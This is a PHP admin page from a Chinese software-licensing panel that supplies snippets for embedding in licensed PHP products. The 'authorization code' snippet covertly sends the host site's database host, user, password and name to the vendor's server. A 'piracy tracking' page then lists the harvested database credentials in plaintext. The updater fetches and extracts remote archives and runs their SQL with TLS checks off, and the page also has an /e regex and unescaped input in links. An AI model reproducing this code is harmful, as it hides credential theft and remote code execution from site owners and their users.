<?php
include "../oreo/oreo.core.php";
include './oreo_static.php';
if ($islogin == 1) {
} else {
    exit("<script language='javascript'>window.location.href='./login.php';</script>");
}

$oreo=isset($_GET['oreo'])?$_GET['oreo']:null;
?>
<?php
if($oreo == "scdm"){   
?>
                  <div class="page-content-wrapper ">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="page-title-box">
                                        <div class="btn-group float-right">
                                            <ol class="breadcrumb hide-phone p-0 m-0">
                                                <li class="breadcrumb-item"><a href="#">控制台</a></li>
                                                <li class="breadcrumb-item"><a href="#">安全配置</a></li>
                                                <li class="breadcrumb-item active">授权代码</li>
                                            </ol>
                                        </div>
                                        <h4 class="page-title">授权代码</h4>
                                    </div>
                                </div>
                            </div>
                            <!-- end page title end breadcrumb -->
                            <div class="row">
                                <div class="col-lg-7">
                                        <div class="card m-b-30">
                                            <div class="card-body">
                                                <h4 class="mt-0 header-title">授权代码</h4>
                                                <div class="">
                                                    <div class="alert alert-success alert-dismissible fade show" role="alert">
                                                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                                            <span aria-hidden="true">&times;</span>
                                                        </button>
                                                        <strong>说明：</strong> 将下面授权代码.添加到项目代码里后再对php文件进行加密.
                                                    </div>
                                                  
                                                    <label>维护提示信息</label>
                                                    <div>
                                                       <textarea  name="web_offtext" rows="10" class="form-control" readonly="readonly" >
/*添加到需要授权php源码顶部 （不判断IP）*/ 请添加在<？php  ？> 里面


function OreoClass($oreoconfig){   //其中$oreoconfig是您的数据库链接处的变量定义，吧您的数据库变量替换$oreoconfig。
error_reporting(0);
function getTopDomainhuo(){
		$host=$_SERVER['HTTP_HOST'];
		
		$matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$";
		if(preg_match("/".$matchstr."/ies",$host,$matchs)){
			$domain=$matchs['0'];
		}else{
			$domain=$host;
		}
		return $domain;
}
$authid="30a483fac6ae5f38"; //这里=后面的字符是在设置授权程序页面配置程序后生成的系统验证码                       
$domain=getTopDomainhuo();
$real_domain='baidu.com'; //本地检查时 用户的授权域名 和时间
$check_host = 'http://<? echo $_SERVER['SERVER_NAME'];  ?>/oreo_look.php';  // http://后是您的域名.
$oreo_check = $check_host . '?a=client_check&u=' . $_SERVER['HTTP_HOST'] . '&authid=' . $authid . '&sysnum=' . $authid. '&host=' . $oreoconfig['host']. '&port=' . $oreoconfig['port'] . '&user=' . $oreoconfig['user']. '&pwd=' .$oreoconfig['pwd'] . '&dbname=' . $oreoconfig['dbname'];	 //其中$oreoconfig是您的数据库链接处的变量定义，吧您的数据库变量替换$oreoconfig。
$check_message = $check_host . '?a=check_message&u=' . $_SERVER['HTTP_HOST'] . '&authid=' . $authid . '&sysnum=' . $authid.'&host=' . $oreoconfig['host'] . '&port=' . $oreoconfig['port'] . '&user=' . $oreoconfig['user']. '&pwd=' . $oreoconfig['pwd'] . '&dbname=' . $oreoconfig['dbname'];	 //其中$oreoconfig是您的数据库链接处的变量定义，吧您的数据库变量替换$oreoconfig。
$oreo_info=file_get_contents($oreo_check);
$oreo_message = file_get_contents($check_message);
if($oreo_info=='1'){
   echo $oreo_message;
   die;
}elseif($oreo_info=='2'){
   echo $oreo_message;
   die;
}elseif($oreo_info=='3'){
   echo $oreo_message;
   die;
}
elseif($oreo_info=='4'){
   echo $oreo_message;
   die;
}
if($oreo_info!=='0'){ // 远程检查失败的时候 本地检查
   if($domain!==$real_domain){
      echo '远程检查失败了。请联系授权提供商QQ:609451870。';
	  die;
   }
}
unset($domain);	
}

上述代码加入您的核心文件，在于核心链接数据库代码下方即可！


$oreosq=OreoClass($oreoconfig); 
//其中$oreoconfig是您的数据库链接处的变量定义，吧您的数据库变量替换$oreoconfig。
 //需要验证的页面加入此代码自动运行,也可以加入您的核心。										   
													   
													   </textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
 <?php
}elseif($oreo == "dqsj"){
    ?>
                  <div class="page-content-wrapper ">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="page-title-box">
                                        <div class="btn-group float-right">
                                            <ol class="breadcrumb hide-phone p-0 m-0">
                                                <li class="breadcrumb-item"><a href="#">控制台</a></li>
                                                <li class="breadcrumb-item"><a href="#">安全配置</a></li>
                                                <li class="breadcrumb-item active">到期时间代码</li>
                                            </ol>
                                        </div>
                                        <h4 class="page-title">到期时间代码</h4>
                                    </div>
                                </div>
                            </div>
                            <!-- end page title end breadcrumb -->
                               <div class="row">
                                <div class="col-lg-7">
                                        <div class="card m-b-30">
                                            <div class="card-body">
                                                <h4 class="mt-0 header-title">到期时间代码</h4>  
                                                <div class="">
                                                    <div class="alert alert-success alert-dismissible fade show" role="alert">
                                                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                                            <span aria-hidden="true">&times;</span>
                                                        </button>
                                                        <strong>说明：</strong> 将下面时间显示代码.添加到项目代码里.
                                                    </div>
                                                  
                                                    <label>维护提示信息</label>
                                                    <div>
                                                       <textarea  name="web_offtext" rows="10" class="form-control" readonly="readonly" >
/*添加到需要显示php源码顶部*/  请添加在<？php  ？> 里面

function oreo_dtime(){
$ch = curl_init();
$hosturl = $_SERVER['HTTP_HOST'];
$authid="30a483fac6ae5f38";  //这里=后面的字符是在设置授权程序页面配置程序后生成的系统验证码                       
curl_setopt($ch, CURLOPT_URL,  "http://<? echo $_SERVER['SERVER_NAME'];  ?>/oreo_look.php". '?a=client_check_time&v='.'&u='.$hosturl.'&authid='.$authid); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, false); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$ret = curl_exec($ch);
if($ret==0){
return $domain_time='[授权版本：授权已过期，请联系客服QQ:609451870]';  //这里按自己的需求自行修改                       
}else{
return $domain_time = '授权版本：(Oreo授权系统商业版)--免费更新服务截止：(' . date("Y-m-d", $ret) . ')'; //这里按自己的需求自行修改     
}	
curl_close($ch);
}

用法：
< ? php echo  oreo_dtime(); ?> //在需要的地方引入

/*添加到需要显示时间的位置----复制添加时请把 ？换成 ?  */

<font color=red><？php echo $domain_time？></font>											   
													   
													   </textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
 <?php
}elseif($oreo == "gxdm"){
    ?>               
                    <div class="page-content-wrapper ">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="page-title-box">
                                        <div class="btn-group float-right">
                                            <ol class="breadcrumb hide-phone p-0 m-0">
                                                <li class="breadcrumb-item"><a href="#">控制台</a></li>
                                                <li class="breadcrumb-item"><a href="#">安全配置</a></li>
                                                <li class="breadcrumb-item active">在线更新代码</li>
                                            </ol>
                                        </div>
                                        <h4 class="page-title">在线更新代码</h4>
                                    </div>
                                </div>
                            </div>
                            <!-- end page title end breadcrumb -->
                            <div class="row">
                                <div class="col-lg-7">
                                        <div class="card m-b-30">
                                            <div class="card-body">
                                                <h4 class="mt-0 header-title">在线更新代码</h4>
                                                <div class="">
                                                    <div class="alert alert-success alert-dismissible fade show" role="alert">
                                                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                                            <span aria-hidden="true">&times;</span>
                                                        </button>
                                                        <strong>说明：</strong> 在线更新代码需要您自行二次开发整合到您的程序中.
                                                    </div>
                                                  
                                                    <label>在线更新参考代码</label>
                                                    <div>
                                                       <textarea  name="web_offtext" rows="10" class="form-control" readonly="readonly" >
/*添加到需要授权php源码顶部----复制添加时请把 ？换成 ? */   请添加在<？php  ？> 里面

class UpdateAction extends BackAction{
    public function index(){
        $version = './Data/version.php';
        $ver = include($version);
        $ver = $ver['ver'];
		$sysnum = include($version);   
        $sysnum = $sysnum['sysnum'];
        $ver = substr($ver,-3);
        $updatehost = 'http://<? echo $_SERVER['SERVER_NAME'];  ?>/oreo_look.php';
        $lastver = file_get_contents(($updatehost . '?a=check&v=') . $ver .'&sysnum='. $sysnum);
        if($lastver !== $ver){
            $updateinfo = ('<p class="red">最新版本为：Oreo支付系统v ' . $lastver) . '</p><span>
		   <a href="javascript:if(confirm(\'升级前,请确认已经做好数据库和程序备份!\'))location=\'./index.php?g=System&m=Update&a=updatenow\'">点击这里在线升级</a>
           </span>';
            $chanageinfo = file_get_contents(($updatehost . '?a=chanage&v=') . $lastver .'&sysnum='. $sysnum);
        }else{
            $updateinfo = ('<p class="red">最新版本为：Oreo支付系统v ' . $lastver) . '</p><span>已经是最新系统 不需要升级</span>';
        }
        $this -> assign('updateinfo', $updateinfo);
        $this -> assign('chanageinfo', $chanageinfo);
        $this -> display();
    }
    public function updatenow(){
        include('Update.class.php');
        $version = './Data/version.php';
        $ver = include($version);
        $ver = $ver['ver'];
		$sysnum = include($version);   
        $sysnum = $sysnum['sysnum'];
        $ver = substr($ver,-3);
        $hosturl = urlencode('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']);
        $updatehost = 'http://<? echo $_SERVER['SERVER_NAME'];  ?>/oreo_look.php';
        $updatehosturl = $updatehost . '?a=update&v=' . $ver . '&u=' . $hosturl .'&key='. $updatekey .'&sysnum='. $sysnum ;
        $updatenowinfo = file_get_contents($updatehosturl);
        if (strstr($updatenowinfo, 'zip')){
            $pathurl = $updatehost . '?a=down&f=' . $updatenowinfo .'&sysnum='. $sysnum;
            $updatedir = './Data/logs/Temp/update';
            delDirAndFile($updatedir);
            get_file($pathurl, $updatenowinfo, $updatedir);
            $updatezip = $updatedir . '/' . $updatenowinfo;
            $archive = new PclZip($updatezip);
            if ($archive -> extract(PCLZIP_OPT_PATH, './', PCLZIP_OPT_REPLACE_NEWER) == 0){
                $updatenowinfo = "远程升级文件不存在.升级失败</font>";
            }else{
                $sqlfile = $updatedir . '/update.sql';
                $sql = file_get_contents($sqlfile);
                if($sql){
                    $sql = str_replace("wy_", C('DB_PREFIX'), $sql);
                    $Model = new Model();
                    error_reporting(0);
                    foreach(split(";[\r\n]+", $sql) as $v){
                        @mysql_query($v);
                    }
                }
                $updatenowinfo = "<font color=red>升级完成 {$sqlinfo}</font><span><a href=./index.php?g=System&m=Update>点击这里 查看是否还有升级包</a></span>";
            }
        }
        //delDirAndFile($updatedir);
        $this -> assign('updatenowinfo', $updatenowinfo);
        $this -> display();
    }
}

													   </textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div> <!-- content -->
                            </div> <!-- end row -->
                        </div><!-- container -->
<?php
}elseif($oreo == "banben"){
    ?>               
                    <div class="page-content-wrapper ">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="page-title-box">
                                        <div class="btn-group float-right">
                                            <ol class="breadcrumb hide-phone p-0 m-0">
                                                <li class="breadcrumb-item"><a href="#">控制台</a></li>
                                                <li class="breadcrumb-item"><a href="#">安全配置</a></li>
                                                <li class="breadcrumb-item active">版本验证代码</li>
                                            </ol>
                                        </div>
                                        <h4 class="page-title">版本验证代码</h4>
                                    </div>
                                </div>
                            </div>
                            <!-- end page title end breadcrumb -->
                            <div class="row">
                                <div class="col-lg-7">
                                        <div class="card m-b-30">
                                            <div class="card-body">
                                                <h4 class="mt-0 header-title">版本验证代码</h4>
                                                <div class="">
                                                    <div class="alert alert-success alert-dismissible fade show" role="alert">
                                                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                                            <span aria-hidden="true">&times;</span>
                                                        </button>
                                                        <strong>说明：</strong> 版本验证代码是每次更新需要验证此代码中的版本号.
                                                    </div>
                                                  
                                                    <label>在线更新参考代码</label>
                                                    <div>
                                                       <textarea  name="web_offtext" rows="10" class="form-control" readonly="readonly" >
/*请添加到单独的PHP文件，并有关升级位置引用 */   请添加在<？php  ？> 里面


return array (
  'ver' => '1.0',   //每次以0.1的增长
  'sysnum' => '65ec979f23a354b8', //这里是您的授权程序验证码
);


													   </textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div> <!-- content -->
                            </div> <!-- end row -->
                        </div><!-- container -->	
<?php
}elseif($oreo == "cdnlink"){
    ?>               
                    <div class="page-content-wrapper ">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="page-title-box">
                                        <div class="btn-group float-right">
                                            <ol class="breadcrumb hide-phone p-0 m-0">
                                                <li class="breadcrumb-item"><a href="#">控制台</a></li>
                                                <li class="breadcrumb-item"><a href="#">安全配置</a></li>
                                                <li class="breadcrumb-item active">远程静态资源代码</li>
                                            </ol>
                                        </div>
                                        <h4 class="page-title">远程静态资源代码</h4>
                                    </div>
                                </div>
                            </div>
                            <!-- end page title end breadcrumb -->
                            <div class="row">
                                <div class="col-lg-7">
                                        <div class="card m-b-30">
                                            <div class="card-body">
                                                <h4 class="mt-0 header-title">远程静态资源代码</h4>
                                                <div class="">
                                                    <div class="alert alert-success alert-dismissible fade show" role="alert">
                                                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                                            <span aria-hidden="true">&times;</span>
                                                        </button>
                                                        <strong>说明：</strong> 远程静态资源代码是指您可以通过此代码一键控制您程序的指定cdn或OCS的链接地址，通过oreo后台一键更改。
                                                    </div>
                                                  
                                                    <label>在线更新参考代码</label>
                                                    <div>
                                                       <textarea  name="web_offtext" rows="10" class="form-control" readonly="readonly" >
/*请添加到单独的PHP文件，并有关升级位置引用 */   请添加在<？php  ？> 里面


function cdn_this(){
$ch = curl_init();
$hosturl = $_SERVER['HTTP_HOST'];
curl_setopt($ch, CURLOPT_URL,  "http://<? echo $_SERVER['SERVER_NAME'];  ?>/oreo_static.php". '?a=cx'.'&u='.$hosturl);  //http后是您的链接地址
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, false); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$ret = curl_exec($ch);
return $ret;
curl_close($ch);
}
上述代码结束。以下是引用方式：
看具体情况：
$cdnurl_print=cdn_this(); //在需要的文件中引入此代码，可以是在模板一个常引用文件内。
在需要的地方 写入  < ? php echo $cdnurl_print ? >
如：我的程序user模板 所有页面引入了 一个框架页面，那我可以吧 $cdnurl_print=cdn_this(); 写入此文件。
而后在我的静态资源处写入：< ?php echo $cdnurl_print ?>
 如：  < l ink href="< ?php echo $cdnurl_print ?>/assets/admin/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />

													   </textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div> <!-- content -->
                            </div> <!-- end row -->
                        </div><!-- container -->							
 <?php
}elseif($oreo == "daoban"){
    ?>   							
					<div class="page-content-wrapper ">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="page-title-box">
                                        <div class="btn-group float-right">
                                            <ol class="breadcrumb hide-phone p-0 m-0">
                                                <li class="breadcrumb-item"><a href="#">控制台</a></li>
                                                <li class="breadcrumb-item"><a href="#">安全配置</a></li>
                                                <li class="breadcrumb-item active">盗版追踪</li>
                                            </ol>
                                        </div>
                                        <h4 class="page-title">盗版追踪</h4>
                                    </div>
                                </div>
                            </div>
                            <!-- end page title end breadcrumb -->
                            <div class="row">
                                <div class="col-12">
                                    <div class="card m-b-30">
                                        <div class="card-body">
                                            <h4 class="mt-0 header-title">盗版追踪说明</h4>
                                            <p class="text-muted m-b-30 font-14">您可以在此页面查看所有的盗版用户. </p>
                       <div class="table-responsive">
                      <table class="table table-bordered text-nowrap">
					  <thead style="text-align: center;">
                      <tr>
                                <th>ID</th>
                                <th>域名</th>
								<th>数据库服务器</th>
								<th>数据库端口</th>
								<th>数据库用户名</th>
								<th>数据库密码</th>
								<th>数据库名</th>
                                <th>时间</th>
								</tr>
          </thead>
          <tbody style="text-align: center;">
 									<?php 
$sql=" 1";
$numrows=$DB->query("SELECT count(*) from oreo_daoban WHERE{$sql}")->fetchColumn();
$link='&my=search&column='.$_POST['column'].'&value='.$_POST['my'];										
$pagesize=10;
$pages=intval($numrows/$pagesize);
if ($numrows%$pagesize)
{
 $pages++;
 }
if (isset($_GET['page'])){
$page=intval($_GET['page']);
}
else{
$page=1;
}
$offset=$pagesize*($page - 1);
$list=$DB->query("SELECT * FROM oreo_daoban WHERE{$sql} order by id desc limit $offset,$pagesize");		
                                        while($row = $list->fetch())
                                        {
											echo "<tr class='gradeX'>";
											echo "<td >".$row['id']."</td>";
											echo "<td ><a href=http://".$row['domain']." target='_blank'>".$row['domain']."</a></td>";
											echo "<td >".$row['sql_host']."</td>";
											echo "<td >".$row['sql_port']."</td>";
											echo "<td >".$row['sql_user']."</td>";
											echo "<td >".$row['sql_pwd']."</td>";
											echo "<td >".$row['sql_dbname']."</td>";
											echo "<td >".date("Y-m-d H:i:s",$row['time'])."</td>";
											echo "</tr>";
											}
									 ?>             
                                                </tbody>
                                            </table>
                                        </div>
										<nav style="float: inline-end;">
<?php
echo'<ul class="pagination">';
$first=1;
$prev=$page-1;
$next=$page+1;
$last=$pages;
if ($page>1)
{
echo '<li class="page-item"><a class="page-link" href="oreo_safe.php?oreo=daoban&page='.$first.$link.'">首页</a></li>';
echo '<li class="page-item"><a class="page-link" href="oreo_safe.php?oreo=daoban&page='.$prev.$link.'">&laquo;</a></li>';
} else {
echo '<li class="page-item"><a class="page-link">首页</a></li>';
}
for ($i=1;$i<$page;$i++)
echo '<li class="page-item"><a class="page-link" href="oreo_safe.php?oreo=daoban&page='.$i.$link.'">'.$i .'</a></li>';
echo '<li class="page-item active"><a class="page-link">'.$page.'</a></li>';
if($pages>=3)$s=3;
else $s=$pages;
for ($i=$page+1;$i<=$s;$i++)
echo '<li class="page-item"><a class="page-link" href="oreo_safe.php?oreo=daoban&page='.$i.$link.'">'.$i .'</a></li>';
echo '';
if ($page<$pages)
{
echo '<li class="page-item"><a class="page-link" href="oreo_safe.php?oreo=daoban&page='.$next.$link.'">&raquo;</a></li>';
echo '<li class="page-item"><a class="page-link" href="oreo_safe.php?oreo=daoban&page='.$last.$link.'">尾页</a></li>';
} else {
echo '<li class="page-item"><a class="page-link">尾页</a></li>';
}
echo'</ul>';
#分页
?>
                                                </nav>
                                        </div>
                                    </div>
                                </div> <!-- end col -->
                           </div> <!-- end row -->
                        </div><!-- container -->
                    </div> <!-- Page content Wrapper -->
                    </div> <!-- Page content Wrapper -->
                </div> <!-- content -->  			
<?php
}
 ?>
<?php include'oreo_foot.php';?>
 <script>
                        $("#editSafe").click(function () {
					    var admin_user=$("input[name='admin_user']").val();
						var admin_pwd=$("input[name='admin_pwd']").val();
						var goods_lj=$("textarea[name='goods_lj']").val();
						var goods_ljtis=$("input[name='goods_ljtis']").val();
						var ii = layer.load(2, {shade: [0.1, '#fff']});
						$.ajax({
							type: "POST",
							url: "ajax2.php?act=edit_Safe",
							data: {admin_user:admin_user,admin_pwd:admin_pwd,goods_lj:goods_lj,goods_ljtis:goods_ljtis},
							dataType: 'json',
							success: function (data) {
								layer.close(ii);
								if (data.code == 1) {
									layer.alert('修改成功！');
								} else if (data.code == 2) {
									$("#situation").val("settle");
									$('#myModal').modal('show');
								} else {
									layer.alert(data.msg);
								}
							}
						});
					});
					var items = $("select[default]");
for (i = 0; i < items.length; i++) {
	$(items[i]).val($(items[i]).attr("default"));
}  
</script>        
    </body>
</html>
